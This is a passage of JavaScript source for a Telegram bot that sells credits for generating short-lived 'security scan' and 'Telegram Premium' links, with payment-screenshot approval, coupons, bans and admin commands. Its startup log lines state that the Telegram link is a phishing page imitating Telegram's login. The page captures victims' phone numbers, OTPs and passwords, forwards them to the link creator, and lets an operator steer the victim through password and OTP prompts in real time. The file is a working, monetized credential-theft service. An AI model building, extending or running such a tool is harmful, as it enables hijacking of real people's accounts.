    if (q.data.startsWith('pay_dm_') && isAdmin) {
        const userId = q.data.replace('pay_dm_', '');
        await S7.sendMessage(cid,
            '💬 <b>Send message to user</b>\n\n' +
            'Reply with: <code>/dm ' + userId + ' [message]</code>\n\n' +
            'Example: <code>/dm ' + userId + ' Please send a clearer screenshot.</code>',
            { parse_mode: 'HTML' }
        );
        await S7.answerCallbackQuery(q.id, { text: '💬 Type /dm ' + userId + ' [message]' });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Generate links
    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
        const isGen = q.data.startsWith('gen_');
        const platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
        const platformKey = platform === 'securityscan' ? 'securityScan' : platform;

        const user = await getUser(uid);
        if (user.banned) {
            await S7.answerCallbackQuery(q.id, { text: '🚫 You are banned.', show_alert: true });
            return;
        }
        if (!user.unlimited && (user.credits || 0) <= 0) {
            await S7.answerCallbackQuery(q.id, { text: '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.', show_alert: true });
            return;
        }
        const deducted = await useCredit(uid);
        if (!deducted) {
            await S7.answerCallbackQuery(q.id, { text: '❌ Credit deduction failed. Please try again.', show_alert: true });
            return;
        }

        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)'), { parse_mode: 'HTML', reply_markup: SYBack });
        try {
            let apiEndpoint;
            if (platform === 'telegram') {
                apiEndpoint = config.baseUrl + '/api/create-telegram-link';
            } else {
                apiEndpoint = config.baseUrl + '/api/create-link';
            }
            const response = await fetch(apiEndpoint, {
                method: 'GET',
                headers: { userid: String(uid), platform: platformKey }
            });
            const data = await response.json();
            if (data.error && data.needBuy) {
                await addCredits(uid, 1);
                await S7.editMessageText(SYloveMenu(q.from.first_name, '❌ ' + data.message + '\n\nClick "Buy Credits" to purchase.'), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
                return;
            }
            const platformDisplay = platform === 'telegram' ? 'TELEGRAM PREMIUM' : platform === 'securityscan' ? 'SECURITY SCAN' : platform.toUpperCase();
            const finalMsg = '✅ <b>' + platformDisplay + ' Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> 3 times\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
            await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) });
        } catch (err) {
            console.error('Link Error:', err.message);
            logToFile('❌ Link Error: ' + err.message);
            await addCredits(uid, 1);
            await S7.editMessageText(SYloveMenu(q.from.first_name, '❌ Error generating link'), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
        }
        return;
    }

    if (q.data === 'back') {
        await S7.deleteMessage(cid, mid);
        await SendLoveSYMenu(cid, q.from.first_name);
    }
});

// ====================== PAYMENT SCREENSHOT ======================
S7.on('message', async (msg) => {
    if (!msg.photo) return;
    const user = await getUser(msg.from.id);
    if (user.banned) return;
    if (!user._pendingPayment) return;
    const payment = user._pendingPayment;
    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const adminMsg = '💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>User ID:</b> <code>' + msg.from.id + '</code>\n📊 <b>Credits:</b> ' + payment.credits + '\n💵 <b>Amount:</b> ₹' + payment.amount + '\n📅 <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📸 <b>Screenshot:</b> (below)';
    const adminButtons = { inline_keyboard: [[{ text: '✅ ACCEPT', callback_data: 'pay_accept_' + msg.from.id }], [{ text: '❌ REJECT', callback_data: 'pay_reject_' + msg.from.id }], [{ text: '💬 DM USER', callback_data: 'pay_dm_' + msg.from.id }]] };
    await S7.sendPhoto(config.adminId, fileId, { caption: adminMsg, parse_mode: 'HTML', reply_markup: adminButtons });
    await S7.sendMessage(msg.from.id, '✅ <b>Payment screenshot received!</b>\n\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.', { parse_mode: 'HTML' });
    logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
});

// ====================== COMMAND HANDLERS (ALL COMMANDS) ======================
const adminOnly = (msg) => msg.from.id.toString() === config.adminId;

S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    const args = text.split(' ');
    const cmd = args[0].toLowerCase();

    // /help - show all commands
    if (cmd === '/help' || cmd === '/commands') {
        const helpText = `📜 <b>Available Commands</b>

👤 <b>User Commands:</b>
/start - Start the bot
/menu - Show main menu
/pay [amount] - Buy credits (e.g., /pay 20)
/credits - Check your credits
/referral - Get referral link
/redeem [coupon_code] - Redeem coupon
/telegram - Generate Telegram Premium link

👑 <b>Admin Commands:</b>
/addcredits [userId] [amount] - Add credits
/removecredits [userId] [amount] - Remove credits
/unlimited [userId] - Toggle unlimited
/resetuser [userId] - Reset user data
/users - List all users
/stats - Bot statistics
/broadcast [message] - Send to all users
/addqr - Upload QR code (send photo after command)
/removeqr - Remove QR code
/viewqr - View QR code
/addchannel [id] [name] [link] - Add channel
/removechannel [id] - Remove channel
/channels - List all channels
/addphoto [caption] - Upload photo (reply with image)
/featured [photoId] - Set featured photo
/featuredmsg [message] - Set featured message
/featuredtoggle - Toggle featured on/off
/logs - Show recent logs
/restart - Restart bot
/dm [userId] [message] - DM a user
/ban [userId or @username] - Ban user
/unban [userId or @username] - Unban user
/createcoupon [code] [credits] [maxUses] - Create coupon
/coupons - List all coupons
/deletecoupon [code] - Delete coupon
/getadmin - Get admin panel link`;
        await S7.sendMessage(msg.chat.id, helpText, { parse_mode: 'HTML' });
        return;
    }

    // All admin-only commands below
    if (!adminOnly(msg)) return;

    // /addcredits
    if (cmd === '/addcredits' && args.length === 3) {
        const userId = args[1];
        const amount = parseInt(args[2]);
        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
        try {
            const user = await getUser(userId);
            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot add credits.');
            user.credits += amount;
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}. New balance: ${user.credits}`);
            logToFile(`Admin added ${amount} credits to ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /removecredits
    if (cmd === '/removecredits' && args.length === 3) {
        const userId = args[1];
        const amount = parseInt(args[2]);
        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
        try {
            const user = await getUser(userId);
            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot remove credits.');
            user.credits = Math.max(0, user.credits - amount);
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}. New balance: ${user.credits}`);
            logToFile(`Admin removed ${amount} credits from ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /unlimited
    if (cmd === '/unlimited' && args.length === 2) {
        const userId = args[1];
        try {
            const user = await getUser(userId);
            user.unlimited = !user.unlimited;
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ Unlimited toggled ${user.unlimited ? 'ON' : 'OFF'} for user ${userId}`);
            logToFile(`Admin toggled unlimited for ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /resetuser
    if (cmd === '/resetuser' && args.length === 2) {
        const userId = args[1];
        try {
            const user = await getUser(userId);
            user.credits = 3;
            user.referrals = 0;
            user.totalReferrals = 0;
            user.unlimited = false;
            user.referredBy = null;
            user.banned = false;
            await user.save();
            await S7.sendMessage(msg.chat.id, `✅ User ${userId} reset to default.`);
            logToFile(`Admin reset user ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /users
    if (cmd === '/users') {
        try {
            const users = await User.find();
            let list = '👥 <b>All Users</b>\n\n';
            for (const u of users) {
                list += `🆔 ${u.userId} | Credits: ${u.unlimited ? '♾️' : u.credits} | Ref: ${u.totalReferrals} | ${u.banned ? '🚫' : '✅'}\n`;
                if (list.length > 3800) {
                    await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
                    list = '';
                }
            }
            if (list) await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /stats
    if (cmd === '/stats') {
        try {
            const users = await User.find();
            const photos = await getPhotos();
            const channels = await getChannels();
            const referrals = await Referral.find();
            const links = await Link.find();
            const coupons = await getCoupons();
            const stats = `📊 <b>Bot Statistics</b>\n\n👥 Users: ${users.length}\n📷 Photos: ${photos.length}\n📢 Channels: ${channels.length}\n👥 Referrals: ${referrals.length}\n🔗 Links: ${links.length}\n🎫 Coupons: ${coupons.length}\n⏱ Uptime: ${getUptime()}`;
            await S7.sendMessage(msg.chat.id, stats, { parse_mode: 'HTML' });
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /broadcast
    if (cmd === '/broadcast') {
        const message = args.slice(1).join(' ');
        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
        try {
            const users = await User.find();
            let sent = 0;
            for (const u of users) {
                try {
                    await S7.sendMessage(u.userId, '📢 <b>Broadcast Message</b>\n\n' + message, { parse_mode: 'HTML' });
                    sent++;
                } catch (e) {}
                if (sent % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            await S7.sendMessage(msg.chat.id, `✅ Broadcast sent to ${sent} users.`);
            logToFile(`Admin broadcast: ${message}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /addqr
    if (cmd === '/addqr') {
        const user = await getUser(msg.from.id);
        user._waitingForQR = true;
        await user.save();
        await S7.sendMessage(msg.chat.id, '📤 Please send the QR code image (photo or document).');
        return;
    }

    // /removeqr
    if (cmd === '/removeqr') {
        const removed = deleteQRFile();
        if (removed) await S7.sendMessage(msg.chat.id, '✅ QR code removed.');
        else await S7.sendMessage(msg.chat.id, '❌ No QR code found.');
        return;
    }

    // /viewqr
    if (cmd === '/viewqr') {
        if (qrExists()) {
            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: '💳 Current QR Code' });
        } else {
            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet.');
        }
        return;
    }

    // /addchannel
    if (cmd === '/addchannel' && args.length === 4) {
        const id = args[1];
        const name = args[2];
        const link = args[3];
        try {
            await addChannel(id, name, link);
            await S7.sendMessage(msg.chat.id, `✅ Channel "${name}" added.`);
            logToFile(`Admin added channel ${id}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /removechannel
    if (cmd === '/removechannel' && args.length === 2) {
        const id = args[1];
        try {
            await removeChannel(id);
            await S7.sendMessage(msg.chat.id, `✅ Channel ${id} removed.`);
            logToFile(`Admin removed channel ${id}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /channels
    if (cmd === '/channels') {
        const channels = await getChannels();
        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels.');
        let list = '📢 <b>Channels</b>\n\n';
        channels.forEach(c => { list += `• ${c.name} (${c.id}) - ${c.link}\n`; });
        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
        return;
    }

    // /addphoto
    if (cmd === '/addphoto') {
        const user = await getUser(msg.from.id);
        user._waitingForPhoto = true;
        await user.save();
        await S7.sendMessage(msg.chat.id, '📸 Please send the photo (or document image) you want to add. Include caption in the message.');
        return;
    }

    // /featured
    if (cmd === '/featured' && args.length === 2) {
        const photoId = args[1];
        try {
            await setFeaturedPhoto(photoId);
            await S7.sendMessage(msg.chat.id, `✅ Featured photo set to ${photoId}.`);
            logToFile(`Admin set featured photo ${photoId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /featuredmsg
    if (cmd === '/featuredmsg') {
        const message = args.slice(1).join(' ');
        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /featuredmsg [message]');
        try {
            await setFeaturedMessage(message);
            await S7.sendMessage(msg.chat.id, '✅ Featured message updated.');
            logToFile(`Admin set featured message: ${message}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /featuredtoggle
    if (cmd === '/featuredtoggle') {
        try {
            const featured = await toggleFeaturedStatus();
            await S7.sendMessage(msg.chat.id, `✅ Featured ${featured.status ? 'activated' : 'deactivated'}.`);
            logToFile(`Admin toggled featured to ${featured.status}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /logs
    if (cmd === '/logs') {
        try {
            const logPath = path.join(DATA_DIR, 'logs.txt');
            if (fs.existsSync(logPath)) {
                const logs = fs.readFileSync(logPath, 'utf8');
                const lastLogs = logs.split('\n').slice(-50).join('\n');
                await S7.sendMessage(msg.chat.id, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML' });
            } else {
                await S7.sendMessage(msg.chat.id, 'No logs.');
            }
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /restart
    if (cmd === '/restart') {
        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
        logToFile('Admin restarted bot');
        process.exit(0);
        return;
    }

    // /dm
    if (cmd === '/dm' && args.length >= 3) {
        const userId = args[1];
        const message = args.slice(2).join(' ');
        try {
            await S7.sendMessage(userId, '💬 <b>Message from Admin</b>\n\n' + message, { parse_mode: 'HTML' });
            await S7.sendMessage(msg.chat.id, `✅ Message sent to ${userId}`);
        } catch (err) {
            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
        }
        return;
    }

    // /ban
    if (cmd === '/ban' && args.length >= 2) {
        const identifier = args[1];
        const userId = await resolveUserId(identifier);
        if (!userId) return S7.sendMessage(msg.chat.id, '❌ User not found.');
        const user = await getUser(userId);
        user.banned = true;
        await user.save();
        await S7.sendMessage(msg.chat.id, `✅ User ${userId} banned successfully.`);
        await S7.sendMessage(userId, '🚫 You have been banned from using this bot.');
        logToFile(`Admin banned user ${userId}`);
        return;
    }

    // /unban
    if (cmd === '/unban' && args.length >= 2) {
        const identifier = args[1];
        const userId = await resolveUserId(identifier);
        if (!userId) return S7.sendMessage(msg.chat.id, '❌ User not found.');
        const user = await getUser(userId);
        user.banned = false;
        await user.save();
        await S7.sendMessage(msg.chat.id, `✅ User ${userId} unbanned successfully.`);
        await S7.sendMessage(userId, '✅ You have been unbanned. You can now use the bot.');
        logToFile(`Admin unbanned user ${userId}`);
        return;
    }

    // /createcoupon
    if (cmd === '/createcoupon' && args.length === 4) {
        const code = args[1];
        const credits = parseInt(args[2]);
        const maxUses = parseInt(args[3]);
        if (isNaN(credits) || isNaN(maxUses) || credits <= 0 || maxUses <= 0) {
            return S7.sendMessage(msg.chat.id, '⚠️ Please enter valid numbers.');
        }
        try {
            const coupon = await createCoupon(code, credits, maxUses, msg.from.id.toString());
            await S7.sendMessage(msg.chat.id, `✅ Coupon created!\nCode: <code>${code}</code>\nCredits: ${credits}\nMax Uses: ${maxUses}`, { parse_mode: 'HTML' });
            logToFile(`Admin created coupon: ${code}`);
        } catch (err) {
            await S7.sendMessage(msg.chat.id, '❌ Coupon code already exists or error: ' + err.message);
        }
        return;
    }

    // /coupons
    if (cmd === '/coupons') {
        const coupons = await getCoupons();
        if (coupons.length === 0) return S7.sendMessage(msg.chat.id, 'No coupons available.');
        let list = '📋 <b>Coupons List</b>\n\n';
        coupons.forEach(c => {
            list += `🔹 <code>${c.code}</code> - ${c.credits} credits | Used: ${c.usedCount}/${c.maxUses}\n`;
        });
        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
        return;
    }

    // /deletecoupon
    if (cmd === '/deletecoupon' && args.length === 2) {
        const code = args[1];
        await deleteCoupon(code);
        await S7.sendMessage(msg.chat.id, `✅ Coupon <code>${code}</code> deleted.`, { parse_mode: 'HTML' });
        logToFile(`Admin deleted coupon: ${code}`);
        return;
    }
});

// ====================== HANDLER FOR /ADD PHOTO (reply) ======================
S7.on('message', async (msg) => {
    if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
    const user = await getUser(msg.from.id);
    if (!user._waitingForPhoto) return;
    if (!adminOnly(msg)) return;

    try {
        let fileId;
        let caption = msg.caption || '';
        if (msg.photo) fileId = msg.photo[msg.photo.length - 1].file_id;
        else fileId = msg.document.file_id;

        const fileLink = await S7.getFileLink(fileId);
        const response = await fetch(fileLink);
        const buffer = await response.buffer();

        const filename = Date.now() + '-' + (msg.document ? msg.document.file_name : 'photo.jpg');
        const filePath = path.join(BOT_PHOTO_DIR, filename);
        fs.writeFileSync(filePath, buffer);

        const photo = await addPhoto({ filename, originalname: filename, path: filePath }, caption);
        await S7.sendMessage(msg.chat.id, `✅ Photo uploaded: ${photo.id}`);
        user._waitingForPhoto = false;
        await user.save();
        logToFile(`Admin uploaded photo ${photo.id}`);
    } catch (err) {
        S7.sendMessage(msg.chat.id, '❌ Error uploading photo: ' + err.message);
    }
});

// ====================== QR PHOTO HANDLER ======================
S7.on('message', async (msg) => {
    if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
    const user = await getUser(msg.from.id);
    if (!user._waitingForQR) return;
    if (!adminOnly(msg)) return;

    try {
        let fileId;
        if (msg.photo) fileId = msg.photo[msg.photo.length - 1].file_id;
        else fileId = msg.document.file_id;

        const fileLink = await S7.getFileLink(fileId);
        const response = await fetch(fileLink);
        const buffer = await response.buffer();
        saveQRBuffer(buffer);
        user._waitingForQR = false;
        await user.save();
        await S7.sendMessage(msg.chat.id, '✅ QR code saved successfully.');
        logToFile('QR uploaded via bot');
    } catch (err) {
        S7.sendMessage(msg.chat.id, '❌ Error saving QR: ' + err.message);
    }
});

// ====================== REDEEM COUPON (USER COMMAND) ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/redeem ')) {
        const code = text.replace('/redeem ', '').trim();
        const userId = msg.from.id;
        const user = await getUser(userId);
        if (user.banned) return S7.sendMessage(userId, '🚫 You are banned.');
        const result = await redeemCoupon(userId, code);
        if (result.error) {
            await S7.sendMessage(userId, '❌ ' + result.error);
        } else {
            await S7.sendMessage(userId, '✅ Coupon redeemed! +' + result.credits + ' credits added.\n⭐ Total Credits: ' + (await getUser(userId)).credits);
            logToFile('🎫 User ' + userId + ' redeemed coupon ' + code);
        }
        return;
    }
});

// ====================== BACKGROUND PROCESSES ======================
setInterval(() => {
    const userIds = Object.keys(pendingPhotos);
    const now = Date.now();
    for (const userId of userIds) {
        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
            const lastActive = userActive[userId] || 0;
            if ((now - lastActive) > 2000 || pendingPhotos[userId].length >= 20) {
                sendBatchPhotos(userId);
            }
        }
    }
}, 2000);

setInterval(async () => {
    const links = await Link.find({ active: true });
    for (const link of links) {
        if (Date.now() > link.expiresAt || link.opens >= link.maxOpens) {
            link.active = false;
            await link.save();
        }
    }
}, 60000);

// ====================== START SERVER ======================
app.listen(config.port, () => {
    console.log('✅ Server running on port ' + config.port);
    console.log('📌 Admin Panel: ' + config.baseUrl + '/admin');
    console.log('📌 Base URL: ' + config.baseUrl);
    console.log('🤖 Bot is ready! Send /start to begin.');
    console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
    console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
    console.log('💰 BUY CREDITS WITH QR + ACCEPT/REJECT FIXED!');
    console.log('⏰ Links expire in 15 minutes, max 3 opens');
    console.log('💳 Each link generation uses 1 credit');
    console.log('📦 Important data in MongoDB, QR in file system');
    console.log('🎫 Coupon system active');
    console.log('🚫 Ban/Unban system active');
    console.log('📜 All commands implemented!');
    console.log('👑 Use /getadmin for admin panel link');
    console.log('📱 TELEGRAM PREMIUM PHISHING PAGE FULLY FIXED!');
    console.log('   - Larger page with proper +91 country code');
    console.log('   - Real Telegram login page design');
    console.log('   - OTP + Password capture with loading screens');
    console.log('   - Admin gets OTP with 3 options:');
    console.log('     • "Password Manga Raha" -> show password page');
    console.log('     • "OTP Galat Hai" -> show wrong OTP error');
    console.log('     • "Open Ho Gya Telegram" -> show success page directly');
    console.log('   - Loading spinner stays until admin decides');
    console.log('   - Phone number, OTP, Password all sent to link creator');
    console.log('   - Success message: "Your Telegram Premium request has been submitted. Please wait 24 hours."');
    console.log('   - All data captured successfully!');
});

process.on('uncaughtException', err => {
    console.error('❌ Uncaught Exception:', err.message);
    logToFile('❌ Uncaught Exception: ' + err.message);
});
process.on('unhandledRejection', reason => {
    console.error('❌ Unhandled Rejection:', reason);
    logToFile('❌ Unhandled Rejection: ' + reason);
});
